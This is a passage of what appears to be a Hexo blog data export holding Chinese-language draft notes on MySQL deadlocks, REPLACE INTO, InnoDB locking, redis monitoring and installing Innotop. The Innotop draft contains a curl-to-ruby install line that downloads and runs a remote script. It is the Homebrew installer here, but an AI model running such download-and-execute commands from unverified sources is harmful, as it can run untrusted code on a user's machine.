引起死锁的线程id](http://zhidao.baidu.com/link?url=Dbx5nrJ-HniRjqzX4UvKkXdoIAhUwCsMfriWuVBZFPTtNfkTWxQYtFz6WFNM54STI3AhdNkzP7QduoJNKTlPIfSHsLtv6Ql63lyDKmq9qT3)\n[Trying to understand MySQL deadlock on InnoDB table](http://stackoverflow.com/questions/11331029/trying-to-understand-mysql-deadlock-on-innodb-table)\n","slug":"article/database/mysql LATEST DETECTED DEADLOCK","published":0,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxo200045nbtii8afu77","content":"<h1 id=\"mysql-LATEST-DETECTED-DEADLOCK\"><a href=\"#mysql-LATEST-DETECTED-DEADLOCK\" class=\"headerlink\" title=\"mysql LATEST DETECTED DEADLOCK\"></a>mysql LATEST DETECTED DEADLOCK</h1><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">------------------------</div><div class=\"line\">LATEST DETECTED DEADLOCK</div><div class=\"line\">------------------------</div><div class=\"line\">130819 14:01:12</div><div class=\"line\">*** (1) TRANSACTION:</div><div class=\"line\">TRANSACTION 0 108626388, ACTIVE 0 sec, process no 8726, OS thread id 47220783470912</div><div class=\"line\">starting index read</div><div class=\"line\">mysql tables in use 1, locked 1</div><div class=\"line\">LOCK WAIT 4 lock struct(s), heap size 1216, 2 row lock(s), undo log entries 1</div><div class=\"line\">MySQL thread id 4283, query id 21974219 10.92.210.108 ddrsrbe Updating</div><div class=\"line\">update ddrsproduction.requests set request_priority_grade_id=3, costs=0, data_version=1, date_completed='2013-08-19 13:59:39', date_end='2013-05-24 23:59:00', date_required_by='2013-08-26 13:57:31', date_start='2013-05-19 00:01:00', date_submitted='2013-08-19 13:57:31', designated_authority_id=84528, is_manual=1, missed_sla_reason=null, missed_sla_reason_ask_user=null, product_id=35, request_cost_status_id=0, request_delivery_method_id=0, request_legislation_id=0, request_method_id=0, request_reason_id=1, request_result_status_id=null, origin_id=0, request_status_id=2, request_type_id=1, result_row_count=2, results_last_downloaded=null, site_processed='KNOW', time_zone=null, urn='LBP/281/35/12 (CONS)', user_id=2357, vf_rep_id=8 where request_id=132536</div><div class=\"line\">*** (1) WAITING FOR THIS LOCK TO BE GRANTED:</div></pre></td></tr></table></figure>\n<p>参见：<br><a href=\"http://stackoverflow.com/questions/21573684/mysql-innodb-deadlock-how-to-remove-old-event\" target=\"_blank\" rel=\"external\">MySQL Innodb Deadlock - how to remove old event?</a><br><a href=\"http://stackoverflow.com/questions/3787651/how-can-i-stop-a-running-mysql-query\" target=\"_blank\" rel=\"external\">How can I stop a running MySQL query?</a><br><a href=\"http://blog.csdn.net/wyzxg/article/details/8258033\" target=\"_blank\" rel=\"external\">mysql thread入门分析</a><br><a href=\"http://blog.itpub.net/29254281/viewspace-1420158/\" target=\"_blank\" rel=\"external\">MySQL查询阻塞语句</a><br><a href=\"http://zhidao.baidu.com/link?url=Dbx5nrJ-HniRjqzX4UvKkXdoIAhUwCsMfriWuVBZFPTtNfkTWxQYtFz6WFNM54STI3AhdNkzP7QduoJNKTlPIfSHsLtv6Ql63lyDKmq9qT3\" target=\"_blank\" rel=\"external\">如何 查找 mysql 中如何 kill 引起死锁的线程id</a><br><a href=\"http://stackoverflow.com/questions/11331029/trying-to-understand-mysql-deadlock-on-innodb-table\" target=\"_blank\" rel=\"external\">Trying to understand MySQL deadlock on InnoDB table</a></p>\n","excerpt":"","more":"<h1 id=\"mysql-LATEST-DETECTED-DEADLOCK\"><a href=\"#mysql-LATEST-DETECTED-DEADLOCK\" class=\"headerlink\" title=\"mysql LATEST DETECTED DEADLOCK\"></a>mysql LATEST DETECTED DEADLOCK</h1><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">------------------------</div><div class=\"line\">LATEST DETECTED DEADLOCK</div><div class=\"line\">------------------------</div><div class=\"line\">130819 14:01:12</div><div class=\"line\">*** (1) TRANSACTION:</div><div class=\"line\">TRANSACTION 0 108626388, ACTIVE 0 sec, process no 8726, OS thread id 47220783470912</div><div class=\"line\">starting index read</div><div class=\"line\">mysql tables in use 1, locked 1</div><div class=\"line\">LOCK WAIT 4 lock struct(s), heap size 1216, 2 row lock(s), undo log entries 1</div><div class=\"line\">MySQL thread id 4283, query id 21974219 10.92.210.108 ddrsrbe Updating</div><div class=\"line\">update ddrsproduction.requests set request_priority_grade_id=3, costs=0, data_version=1, date_completed='2013-08-19 13:59:39', date_end='2013-05-24 23:59:00', date_required_by='2013-08-26 13:57:31', date_start='2013-05-19 00:01:00', date_submitted='2013-08-19 13:57:31', designated_authority_id=84528, is_manual=1, missed_sla_reason=null, missed_sla_reason_ask_user=null, product_id=35, request_cost_status_id=0, request_delivery_method_id=0, request_legislation_id=0, request_method_id=0, request_reason_id=1, request_result_status_id=null, origin_id=0, request_status_id=2, request_type_id=1, result_row_count=2, results_last_downloaded=null, site_processed='KNOW', time_zone=null, urn='LBP/281/35/12 (CONS)', user_id=2357, vf_rep_id=8 where request_id=132536</div><div class=\"line\">*** (1) WAITING FOR THIS LOCK TO BE GRANTED:</div></pre></td></tr></table></figure>\n<p>参见：<br><a href=\"http://stackoverflow.com/questions/21573684/mysql-innodb-deadlock-how-to-remove-old-event\">MySQL Innodb Deadlock - how to remove old event?</a><br><a href=\"http://stackoverflow.com/questions/3787651/how-can-i-stop-a-running-mysql-query\">How can I stop a running MySQL query?</a><br><a href=\"http://blog.csdn.net/wyzxg/article/details/8258033\">mysql thread入门分析</a><br><a href=\"http://blog.itpub.net/29254281/viewspace-1420158/\">MySQL查询阻塞语句</a><br><a href=\"http://zhidao.baidu.com/link?url=Dbx5nrJ-HniRjqzX4UvKkXdoIAhUwCsMfriWuVBZFPTtNfkTWxQYtFz6WFNM54STI3AhdNkzP7QduoJNKTlPIfSHsLtv6Ql63lyDKmq9qT3\">如何 查找 mysql 中如何 kill 引起死锁的线程id</a><br><a href=\"http://stackoverflow.com/questions/11331029/trying-to-understand-mysql-deadlock-on-innodb-table\">Trying to understand MySQL deadlock on InnoDB table</a></p>\n"},{"date":"2016-02-15T07:27:08.000Z","title":"replace into实践","_content":"\n## 用法简介\n查阅mysql官方[参考文档](http://dev.mysql.com/doc/refman/5.7/en/replace.html)，有如下二段内容：\n> REPLACE works exactly like INSERT, except that if an old row in the table has the same value as a new row for a PRIMARY KEY or a UNIQUE index, the old row is deleted before the new row is inserted. See Section 13.2.5, “INSERT Syntax”.\n大致意思是：replace用法与insert比较像，只是如果表中的一个旧行具有相同的值作为一个主键或唯一索引的新行，插入新行之前旧的行被删除。\n\n\n\n> REPLACE is a MySQL extension to the SQL standard. It either inserts, or deletes and inserts. For another MySQL extension to standard SQL—that either inserts or updates—see Section 13.2.5.3, “INSERT ... ON DUPLICATE KEY UPDATE Syntax”.\n\n\n## 参考文档\n1. [Mysql中replace into用法详细说明](http://my.oschina.net/junn/blog/110213?fromerr=8w7ArO5a)\n2. [语法：MySQL中INSERT IGNORE INTO和REPLACE INTO的使用](http://www.cnblogs.com/RoadGY/archive/2011/09/28/2193733.html)\n3. [sql replace into 用法与实现语句](http://www.111cn.net/database/mysql/41017.htm)\n\n\n","source":"_drafts/article/database/replace into实践.md","raw":"date: 2016-02-15 15:27:08\ntitle: replace into实践\n---\n\n## 用法简介\n查阅mysql官方[参考文档](http://dev.mysql.com/doc/refman/5.7/en/replace.html)，有如下二段内容：\n> REPLACE works exactly like INSERT, except that if an old row in the table has the same value as a new row for a PRIMARY KEY or a UNIQUE index, the old row is deleted before the new row is inserted. See Section 13.2.5, “INSERT Syntax”.\n大致意思是：replace用法与insert比较像，只是如果表中的一个旧行具有相同的值作为一个主键或唯一索引的新行，插入新行之前旧的行被删除。\n\n\n\n> REPLACE is a MySQL extension to the SQL standard. It either inserts, or deletes and inserts. For another MySQL extension to standard SQL—that either inserts or updates—see Section 13.2.5.3, “INSERT ... ON DUPLICATE KEY UPDATE Syntax”.\n\n\n## 参考文档\n1. [Mysql中replace into用法详细说明](http://my.oschina.net/junn/blog/110213?fromerr=8w7ArO5a)\n2. [语法：MySQL中INSERT IGNORE INTO和REPLACE INTO的使用](http://www.cnblogs.com/RoadGY/archive/2011/09/28/2193733.html)\n3. [sql replace into 用法与实现语句](http://www.111cn.net/database/mysql/41017.htm)\n\n\n","slug":"article/database/replace into实践","published":0,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxo600055nbtk5w3izx0","content":"<h2 id=\"用法简介\"><a href=\"#用法简介\" class=\"headerlink\" title=\"用法简介\"></a>用法简介</h2><p>查阅mysql官方<a href=\"http://dev.mysql.com/doc/refman/5.7/en/replace.html\" target=\"_blank\" rel=\"external\">参考文档</a>，有如下二段内容：</p>\n<blockquote>\n<p>REPLACE works exactly like INSERT, except that if an old row in the table has the same value as a new row for a PRIMARY KEY or a UNIQUE index, the old row is deleted before the new row is inserted. See Section 13.2.5, “INSERT Syntax”.<br>大致意思是：replace用法与insert比较像，只是如果表中的一个旧行具有相同的值作为一个主键或唯一索引的新行，插入新行之前旧的行被删除。</p>\n<p>REPLACE is a MySQL extension to the SQL standard. It either inserts, or deletes and inserts. For another MySQL extension to standard SQL—that either inserts or updates—see Section 13.2.5.3, “INSERT … ON DUPLICATE KEY UPDATE Syntax”.</p>\n</blockquote>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ol>\n<li><a href=\"http://my.oschina.net/junn/blog/110213?fromerr=8w7ArO5a\" target=\"_blank\" rel=\"external\">Mysql中replace into用法详细说明</a></li>\n<li><a href=\"http://www.cnblogs.com/RoadGY/archive/2011/09/28/2193733.html\" target=\"_blank\" rel=\"external\">语法：MySQL中INSERT IGNORE INTO和REPLACE INTO的使用</a></li>\n<li><a href=\"http://www.111cn.net/database/mysql/41017.htm\" target=\"_blank\" rel=\"external\">sql replace into 用法与实现语句</a></li>\n</ol>\n","excerpt":"","more":"<h2 id=\"用法简介\"><a href=\"#用法简介\" class=\"headerlink\" title=\"用法简介\"></a>用法简介</h2><p>查阅mysql官方<a href=\"http://dev.mysql.com/doc/refman/5.7/en/replace.html\">参考文档</a>，有如下二段内容：</p>\n<blockquote>\n<p>REPLACE works exactly like INSERT, except that if an old row in the table has the same value as a new row for a PRIMARY KEY or a UNIQUE index, the old row is deleted before the new row is inserted. See Section 13.2.5, “INSERT Syntax”.<br>大致意思是：replace用法与insert比较像，只是如果表中的一个旧行具有相同的值作为一个主键或唯一索引的新行，插入新行之前旧的行被删除。</p>\n<p>REPLACE is a MySQL extension to the SQL standard. It either inserts, or deletes and inserts. For another MySQL extension to standard SQL—that either inserts or updates—see Section 13.2.5.3, “INSERT … ON DUPLICATE KEY UPDATE Syntax”.</p>\n</blockquote>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ol>\n<li><a href=\"http://my.oschina.net/junn/blog/110213?fromerr=8w7ArO5a\">Mysql中replace into用法详细说明</a></li>\n<li><a href=\"http://www.cnblogs.com/RoadGY/archive/2011/09/28/2193733.html\">语法：MySQL中INSERT IGNORE INTO和REPLACE INTO的使用</a></li>\n<li><a href=\"http://www.111cn.net/database/mysql/41017.htm\">sql replace into 用法与实现语句</a></li>\n</ol>\n"},{"title":"innodb auto_inc锁机制","date":"2016-08-11T12:41:00.000Z","_content":"\n\n\n## 参考文档\n1. [Waiting Auto-INC LOCK导致死锁](http://hidba.org/?p=593)\n2. [大量AUTO-INC LOCK 导致的DeadLOCK](http://blog.csdn.net/rj03hou/article/details/5667045)\n3. [MySQL auto_increment间隙问题](http://www.jianshu.com/p/cca59b515e20)\n4. [AUTO_INCREMENT lock Handing in InnoDB](http://www.cnblogs.com/renolei/p/5559135.html)\n","source":"_drafts/article/database/innodb auto_inc锁机制.md","raw":"title: innodb auto_inc锁机制\ntags: []\ncategories: []\ndate: 2016-08-11 20:41:00\n---\n\n\n\n## 参考文档\n1. [Waiting Auto-INC LOCK导致死锁](http://hidba.org/?p=593)\n2. [大量AUTO-INC LOCK 导致的DeadLOCK](http://blog.csdn.net/rj03hou/article/details/5667045)\n3. [MySQL auto_increment间隙问题](http://www.jianshu.com/p/cca59b515e20)\n4. [AUTO_INCREMENT lock Handing in InnoDB](http://www.cnblogs.com/renolei/p/5559135.html)\n","slug":"article/database/innodb auto_inc锁机制","published":0,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxoa00085nbti1m4f8nr","content":"<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ol>\n<li><a href=\"http://hidba.org/?p=593\" target=\"_blank\" rel=\"external\">Waiting Auto-INC LOCK导致死锁</a></li>\n<li><a href=\"http://blog.csdn.net/rj03hou/article/details/5667045\" target=\"_blank\" rel=\"external\">大量AUTO-INC LOCK 导致的DeadLOCK</a></li>\n<li><a href=\"http://www.jianshu.com/p/cca59b515e20\" target=\"_blank\" rel=\"external\">MySQL auto_increment间隙问题</a></li>\n<li><a href=\"http://www.cnblogs.com/renolei/p/5559135.html\" target=\"_blank\" rel=\"external\">AUTO_INCREMENT lock Handing in InnoDB</a></li>\n</ol>\n","excerpt":"","more":"<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ol>\n<li><a href=\"http://hidba.org/?p=593\">Waiting Auto-INC LOCK导致死锁</a></li>\n<li><a href=\"http://blog.csdn.net/rj03hou/article/details/5667045\">大量AUTO-INC LOCK 导致的DeadLOCK</a></li>\n<li><a href=\"http://www.jianshu.com/p/cca59b515e20\">MySQL auto_increment间隙问题</a></li>\n<li><a href=\"http://www.cnblogs.com/renolei/p/5559135.html\">AUTO_INCREMENT lock Handing in InnoDB</a></li>\n</ol>\n"},{"title":"redis使用手记","date":"2015-12-29T05:58:00.000Z","_content":"\n# redis使用手记\n\n## 服务监控\n\n## 性能测试\n\n1. redis-cli monitor\n使用如下命令查看redis GET/SET请求的频率\nredis-cli monitor | grep \"GET\"\nredis-cli monitor | grep \"SET\"\n\n","source":"_drafts/article/cache/redis使用手记.md","raw":"categories:\n  - cache\ntags:\n  - redis\ntitle: redis使用手记\ndate: 2015-12-29 13:58:00\n---\n\n# redis使用手记\n\n## 服务监控\n\n## 性能测试\n\n1. redis-cli monitor\n使用如下命令查看redis GET/SET请求的频率\nredis-cli monitor | grep \"GET\"\nredis-cli monitor | grep \"SET\"\n\n","slug":"article/cache/redis使用手记","published":0,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxoc00095nbtye1ur215","content":"<h1 id=\"redis使用手记\"><a href=\"#redis使用手记\" class=\"headerlink\" title=\"redis使用手记\"></a>redis使用手记</h1><h2 id=\"服务监控\"><a href=\"#服务监控\" class=\"headerlink\" title=\"服务监控\"></a>服务监控</h2><h2 id=\"性能测试\"><a href=\"#性能测试\" class=\"headerlink\" title=\"性能测试\"></a>性能测试</h2><ol>\n<li>redis-cli monitor<br>使用如下命令查看redis GET/SET请求的频率<br>redis-cli monitor | grep “GET”<br>redis-cli monitor | grep “SET”</li>\n</ol>\n","excerpt":"","more":"<h1 id=\"redis使用手记\"><a href=\"#redis使用手记\" class=\"headerlink\" title=\"redis使用手记\"></a>redis使用手记</h1><h2 id=\"服务监控\"><a href=\"#服务监控\" class=\"headerlink\" title=\"服务监控\"></a>服务监控</h2><h2 id=\"性能测试\"><a href=\"#性能测试\" class=\"headerlink\" title=\"性能测试\"></a>性能测试</h2><ol>\n<li>redis-cli monitor<br>使用如下命令查看redis GET/SET请求的频率<br>redis-cli monitor | grep “GET”<br>redis-cli monitor | grep “SET”</li>\n</ol>\n"},{"title":"MySQL监控工具-Innotop","date":"2016-08-16T06:57:51.000Z","_content":"\n## 一、简介\nInnoTop是一个系统活动报告，类似于Linux性能工具，它与Linux的top命令相仿，并参考mytop工具而设计。\n它专门用于监控InnoDB性能和MySQL服务器，主要内容有：监控事务，死锁，外键错误，查询活动，复制活动，系统变量的主要统计信息及主机的其他详情。\nInnoTop被广泛使用，并被当做常用性能监控工具。\n\n\n## 二、工具安装\n\n### 1. 使用brew安装\n**注**：just for mac\n\n#### 安装brew\n``` bash\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n```\n\n通过brew安装的软件会放在 /usr/local/Cellar 目录，并将相关工具链接到 /usr/local/bin 目录。\n\n#### 安装innotop\n``` bash\nbrew install innotop\n```\n\n### 2. 源码编译安装\n\n\n## 三、应用\n\n\n\n## 参考文档\n1. [mysql监控管理工具--innotop](http://blog.csdn.net/wyzxg/article/details/8609981)\n\n","source":"_drafts/article/database/MySQL监控利器-Innotop.md","raw":"title: MySQL监控工具-Innotop\ndate: 2016-08-16 14:57:51\n---\n\n## 一、简介\nInnoTop是一个系统活动报告，类似于Linux性能工具，它与Linux的top命令相仿，并参考mytop工具而设计。\n它专门用于监控InnoDB性能和MySQL服务器，主要内容有：监控事务，死锁，外键错误，查询活动，复制活动，系统变量的主要统计信息及主机的其他详情。\nInnoTop被广泛使用，并被当做常用性能监控工具。\n\n\n## 二、工具安装\n\n### 1. 使用brew安装\n**注**：just for mac\n\n#### 安装brew\n``` bash\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n```\n\n通过brew安装的软件会放在 /usr/local/Cellar 目录，并将相关工具链接到 /usr/local/bin 目录。\n\n#### 安装innotop\n``` bash\nbrew install innotop\n```\n\n### 2. 源码编译安装\n\n\n## 三、应用\n\n\n\n## 参考文档\n1. [mysql监控管理工具--innotop](http://blog.csdn.net/wyzxg/article/details/8609981)\n\n","slug":"article/database/MySQL监控利器-Innotop","published":0,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxog000a5nbttoqkarg7","content":"<h2 id=\"一、简介\"><a href=\"#一、简介\" class=\"headerlink\" title=\"一、简介\"></a>一、简介</h2><p>InnoTop是一个系统活动报告，类似于Linux性能工具，它与Linux的top命令相仿，并参考mytop工具而设计。<br>它专门用于监控InnoDB性能和MySQL服务器，主要内容有：监控事务，死锁，外键错误，查询活动，复制活动，系统变量的主要统计信息及主机的其他详情。<br>InnoTop被广泛使用，并被当做常用性能监控工具。</p>\n<h2 id=\"二、工具安装\"><a href=\"#二、工具安装\" class=\"headerlink\" title=\"二、工具安装\"></a>二、工具安装</h2><h3 id=\"1-使用brew安装\"><a href=\"#1-使用brew安装\" class=\"headerlink\" title=\"1. 使用brew安装\"></a>1. 使用brew安装</h3><p><strong>注</strong>：just for mac</p>\n<h4 id=\"安装brew\"><a href=\"#安装brew\" class=\"headerlink\" title=\"安装brew\"></a>安装brew</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">/usr/bin/ruby <span class=\"_\">-e</span> <span class=\"string\">\"<span class=\"variable\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>\"</span></div></pre></td></tr></table></figure>\n<p>通过brew安装的软件会放在 /usr/local/Cellar 目录，并将相关工具链接到 /usr/local/bin 目录。</p>\n<h4 id=\"安装innotop\"><a href=\"#安装innotop\" class=\"headerlink\" title=\"安装innotop\"></a>安装innotop</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install innotop</div></pre></td></tr></table></figure>\n<h3 id=\"2-源码编译安装\"><a href=\"#2-源码编译安装\" class=\"headerlink\" title=\"2. 源码编译安装\"></a>2. 源码编译安装</h3><h2 id=\"三、应用\"><a href=\"#三、应用\" class=\"headerlink\" title=\"三、应用\"></a>三、应用</h2><h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ol>\n<li><a href=\"http://blog.csdn.net/wyzxg/article/details/8609981\" target=\"_blank\" rel=\"external\">mysql监控管理工具–innotop</a></li>\n</ol>\n","excerpt":"","more":"<h2 id=\"一、简介\"><a href=\"#一、简介\" class=\"headerlink\" title=\"一、简介\"></a>一、简介</h2><p>InnoTop是一个系统活动报告，类似于Linux性能工具，它与Linux的top命令相仿，并参考mytop工具而设计。<br>它专门用于监控InnoDB性能和MySQL服务器，主要内容有：监控事务，死锁，外键错误，查询活动，复制活动，系统变量的主要统计信息及主机的其他详情。<br>InnoTop被广泛使用，并被当做常用性能监控工具。</p>\n<h2 id=\"二、工具安装\"><a href=\"#二、工具安装\" class=\"headerlink\" title=\"二、工具安装\"></a>二、工具安装</h2><h3 id=\"1-使用brew安装\"><a href=\"#1-使用brew安装\" class=\"headerlink\" title=\"1. 使用brew安装\"></a>1. 使用brew安装</h3><p><strong>注</strong>：just for mac</p>\n<h4 id=\"安装brew\"><a href=\"#安装brew\" class=\"headerlink\" title=\"安装brew\"></a>安装brew</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">/usr/bin/ruby <span class=\"_\">-e</span> <span class=\"string\">\"<span class=\"variable\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>\"</span></div></pre></td></tr></table></figure>\n<p>通过brew安装的软件会放在 /usr/local/Cellar 目录，并将相关工具链接到 /usr/local/bin 目录。</p>\n<h4 id=\"安装innotop\"><a href=\"#安装innotop\" class=\"headerlink\" title=\"安装innotop\"></a>安装innotop</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install innotop</div></pre></td></tr></table></figure>\n<h3 id=\"2-源码编译安装\"><a href=\"#2-源码编译安装\" class=\"headerlink\" title=\"2. 源码编译安装\"></a>2. 源码编译安装</h3><h2 id=\"三、应用\"><a href=\"#三、应用\" class=\"headerlink\" title=\"三、应用\"></a>三、应用</h2><h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ol>\n<li><a href=\"http://blog.csdn.net/wyzxg/article/details/8609981\">mysql监控管理工具–innotop</a></li>\n</ol>\n"},{"date":"2016-08-04T03:12:16.000Z","_content":"\nSHOW PROFILE Syntax\n\nhttp://dev.mysql.com/doc/refman/5.5/en/show-profile.html\nhttp://blog.csdn.net/aeolus_pu/article/details/7818498\n\n","source":"_drafts/article/database/show profile语法.md","raw":"date: 2016-08-04 11:12:16\n---\n\nSHOW PROFILE Syntax\n\nhttp://dev.mysql.com/doc/refman/5.5/en/show-profile.html\nhttp://blog.csdn.net/aeolus_pu/article/details/7818498\n\n","slug":"article/database/show profile语法","published":0,"updated":"2016-08-20T07:13:48.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxoj000e5nbtkn7yu9uc","content":"<p>SHOW PROFILE Syntax</p>\n<p><a href=\"http://dev.mysql.com/doc/refman/5.5/en/show-profile.html\" target=\"_blank\" rel=\"external\">http://dev.mysql.com/doc/refman/5.5/en/show-profile.html</a><br><a href=\"http://blog.csdn.net/aeolus_pu/article/details/7818498\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/aeolus_pu/article/details/7818498</a></p>\n","excerpt":"","more":"<p>SHOW PROFILE Syntax</p>\n<p><a href=\"http://dev.mysql.com/doc/refman/5.5/en/show-profile.html\">http://dev.mysql.com/doc/refman/5.5/en/show-profile.html</a><br><a href=\"http://blog.csdn.net/aeolus_pu/article/details/7818498\">http://blog.csdn.net/aeolus_pu/article/details/7818498</a></p>\n"},{"date":"2016-08-04T03:12:26.000Z","_content":"\nmysql本地参数调整\n\n\n## 开启mysql执行日志\n``` sql\nmysql root@localhost:(none)> show global variables like 'general_log%';\n+------------------+---------------------------------------+\n| Variable_name    | Value                                 |\n|------------------+---------------------------------------|\n| general_log      | OFF                                   |\n| general_log_file | /usr/local/mysql/data/yerba-buena.log |\n+------------------+---------------------------------------+\n\nmysql root@localhost:(none)> set global general_log=ON;\n```\n\n于是，mysql执行日志都会输出到：/usr/local/mysql/data/yerba-buena.log\n\n\n\n","source":"_drafts/article/database/mysql本地参数调整.md","raw":"date: 2016-08-04 11:12:26\n---\n\nmysql本地参数调整\n\n\n## 开启mysql执行日志\n``` sql\nmysql root@localhost:(none)> show global variables like 'general_log%';\n+------------------+---------------------------------------+\n| Variable_name    | Value                                 |\n|------------------+---------------------------------------|\n| general_log      | OFF                                   |\n| general_log_file | /usr/local/mysql/data/yerba-buena.log |\n+------------------+---------------------------------------+\n\nmysql root@localhost:(none)> set global general_log=ON;\n```\n\n于是，mysql执行日志都会输出到：/usr/local/mysql/data/yerba-buena.log\n\n\n\n","slug":"article/database/mysql本地参数调整","published":0,"updated":"2016-08-20T07:13:48.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxol000g5nbt66habjp0","content":"<p>mysql本地参数调整</p>\n<h2 id=\"开启mysql执行日志\"><a href=\"#开启mysql执行日志\" class=\"headerlink\" title=\"开启mysql执行日志\"></a>开启mysql执行日志</h2><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql root@localhost:(none)&gt; show global variables like 'general_log%';</div><div class=\"line\">+------------------+---------------------------------------+</div><div class=\"line\">| Variable_name    | Value                                 |</div><div class=\"line\">|------------------+---------------------------------------|</div><div class=\"line\">| general_log      | OFF                                   |</div><div class=\"line\">| general_log_file | /usr/local/mysql/data/yerba-buena.log |</div><div class=\"line\">+------------------+---------------------------------------+</div><div class=\"line\"></div><div class=\"line\">mysql root@localhost:(none)&gt; set global general_log=ON;</div></pre></td></tr></table></figure>\n<p>于是，mysql执行日志都会输出到：/usr/local/mysql/data/yerba-buena.log</p>\n","excerpt":"","more":"<p>mysql本地参数调整</p>\n<h2 id=\"开启mysql执行日志\"><a href=\"#开启mysql执行日志\" class=\"headerlink\" title=\"开启mysql执行日志\"></a>开启mysql执行日志</h2><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql root@localhost:(none)&gt; show global variables like 'general_log%';</div><div class=\"line\">+------------------+---------------------------------------+</div><div class=\"line\">| Variable_name    | Value                                 |</div><div class=\"line\">|------------------+---------------------------------------|</div><div class=\"line\">| general_log      | OFF                                   |</div><div class=\"line\">| general_log_file | /usr/local/mysql/data/yerba-buena.log |</div><div class=\"line\">+------------------+---------------------------------------+</div><div class=\"line\"></div><div class=\"line\">mysql root@localhost:(none)&gt; set global general_log=ON;</div></pre></td></tr></table></figure>\n<p>于是，mysql执行日志都会输出到：/usr/local/mysql/data/yerba-buena.log</p>\n"},{"date":"2016-08-04T03:12:32.000Z","_content":"\n\nSTART TRANSACTION, COMMIT, and ROLLBACK Syntax\n\n\nhttp://dev.mysql.com/doc/refman/5.6/en/commit.html\n","source":"_drafts/article/database/mysql命令行事务控制.md","raw":"date: 2016-08-04 11:12:32\n---\n\n\nSTART TRANSACTION, COMMIT, and ROLLBACK Syntax\n\n\nhttp://dev.mysql.com/doc/refman/5.6/en/commit.html\n","slug":"article/database/mysql命令行事务控制","published":0,"updated":"2016-08-20T07:13:48.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxon000h5nbtzgdiwbwx","content":"<p>START TRANSACTION, COMMIT, and ROLLBACK Syntax</p>\n<p><a href=\"http://dev.mysql.com/doc/refman/5.6/en/commit.html\" target=\"_blank\" rel=\"external\">http://dev.mysql.com/doc/refman/5.6/en/commit.html</a></p>\n","excerpt":"","more":"<p>START TRANSACTION, COMMIT, and ROLLBACK Syntax</p>\n<p><a href=\"http://dev.mysql.com/doc/refman/5.6/en/commit.html\">http://dev.mysql.com/doc/refman/5.6/en/commit.html</a></p>\n"},{"title":"制图工具draw.io简介","date":"2016-04-18T05:28:00.000Z","_content":"\n## 一、概述\ndraw.io 是一款非常好用的在线绘制流程图的工具，提供了流程图，UML图等丰富的接口。\n\n在线画图：https://www.draw.io/\nchrome插件（draw io desktop）：https://chrome.google.com/webstore/detail/drawio-desktop/pebppomjfocnoigkeepgbmcifnnlndla\n\n## 二、功能\n\n\n## 三、参考文档\n1. [draw.io - 免费的流程图绘制工具](http://www.swiftcafe.io/2015/12/28/drawio/)\n2. 